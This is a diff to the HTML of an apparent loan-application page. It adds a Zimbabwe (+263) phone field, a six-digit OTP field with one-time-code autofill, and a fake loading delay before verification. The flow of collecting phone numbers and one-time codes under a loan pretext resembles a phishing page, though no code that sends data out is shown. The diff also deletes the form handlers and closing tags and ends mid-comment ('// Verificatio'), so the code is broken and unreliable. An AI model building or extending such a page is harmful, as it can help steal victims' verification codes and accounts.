@@ -384,6 +384,55 @@
       box-shadow: 0 0 0 3px rgba(0, 119, 204, .1);
     }
 
+    /* Phone input with flag + country code */
+    .phone-wrapper {
+      display: flex;
+      align-items: center;
+      height: 54px;
+      border: 1px solid #e0e5ed;
+      border-radius: 12px;
+      background: #fafbfe;
+      overflow: hidden;
+    }
+
+    .phone-wrapper:focus-within {
+      border-color: #0077cc;
+      box-shadow: 0 0 0 3px rgba(0, 119, 204, .1);
+    }
+
+    .phone-prefix {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 0 12px;
+      background: #f0f4f8;
+      height: 100%;
+      border-right: 1px solid #e0e5ed;
+      white-space: nowrap;
+      font-size: 15px;
+      font-weight: 600;
+      color: #172033;
+    }
+
+    .phone-prefix .flag {
+      font-size: 20px;
+      line-height: 1;
+    }
+
+    .phone-wrapper input {
+      border: none;
+      background: transparent;
+      height: 100%;
+      flex: 1;
+      padding: 0 15px;
+      box-shadow: none !important;
+    }
+
+    .phone-wrapper input:focus {
+      border: none;
+      box-shadow: none;
+    }
+
     .page button {
       width: 100%;
       min-height: 54px;
@@ -399,16 +448,6 @@
 
     .page button:hover {
       background: #005fa3;
-    }
-
-    .secondary {
-      background: #eef1f6;
-      color: #30394c;
-      margin-top: 12px;
-    }
-
-    .secondary:hover {
-      background: #e0e5ed;
     }
 
     .otp-input {
@@ -624,7 +663,13 @@
         <form id="detailsForm">
           <div class="field">
             <label for="mobile">Enter your phone number</label>
-            <input type="tel" id="mobile" placeholder="Enter your phone number" required>
+            <div class="phone-wrapper">
+              <div class="phone-prefix">
+                <span class="flag">🇿🇼</span>
+                <span>+263</span>
+              </div>
+              <input type="tel" id="mobile" placeholder="7X XXX XXXX" required autocomplete="tel-national">
+            </div>
           </div>
 
           <div class="field">
@@ -645,11 +690,19 @@
         <form id="otpForm">
           <div class="field">
             <label for="otp">Verification Code</label>
-            <input type="text" id="otp" class="otp-input" placeholder="••••••" inputmode="numeric" maxlength="6" pattern="[0-9]{6}" required>
+            <input
+              type="text"
+              id="otp"
+              class="otp-input"
+              placeholder="••••••"
+              inputmode="numeric"
+              maxlength="6"
+              pattern="[0-9]{6}"
+              autocomplete="one-time-code"
+              required
+            >
           </div>
-
-          <button type="submit">Verify Code</button>
-          <button type="button" class="secondary" id="backButton">Back</button>
+          <!-- Buttons removed as requested -->
         </form>
 
         <p id="result" class="description hidden" style="margin-top:20px; margin-bottom:0;"></p>
@@ -710,11 +763,9 @@
         return;
       }
 
-      // Show loading
       document.getElementById("applicationCard").classList.add("hidden");
       document.getElementById("loadingCard").classList.remove("hidden");
 
-      // After 2.5 seconds go to Verification
       setTimeout(function() {
         document.getElementById("loanPage").classList.add("hidden");
         document.getElementById("verificationPage").classList.remove("hidden");
@@ -722,25 +773,4 @@
       }, 2500);
     });
 
-    // Verification page
-    document.getElementById("detailsForm").addEventListener("submit", function(event) {
-      event.preventDefault();
-      document.getElementById("detailsPage").classList.add("hidden");
-      document.getElementById("otpPage").classList.remove("hidden");
-    });
-
-    document.getElementById("backButton").addEventListener("click", function() {
-      document.getElementById("otpPage").classList.add("hidden");
-      document.getElementById("detailsPage").classList.remove("hidden");
-    });
-
-    document.getElementById("otpForm").addEventListener("submit", function(event) {
-      event.preventDefault();
-      const result = document.getElementById("result");
-      result.textContent = "Wait for otp verification";
-      result.classList.remove("hidden");
-    });
-  </script>
-
-</body>
-  </html>
+    // Verificatio
